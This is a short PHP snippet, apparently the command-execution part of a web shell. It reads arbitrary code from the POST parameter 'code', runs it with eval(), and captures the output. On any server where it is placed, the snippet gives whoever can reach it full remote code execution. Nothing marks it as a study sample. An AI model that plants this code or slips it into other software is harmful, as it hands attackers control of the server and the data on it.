<?php
$s_code = $_POST['code'];
$s_lang = 'php';
if(strtolower($s_lang)=='php'){
	ob_start();
	eval($s_code);
	$s_res = ob_get_contents();
	ob_end_clean();
}
?>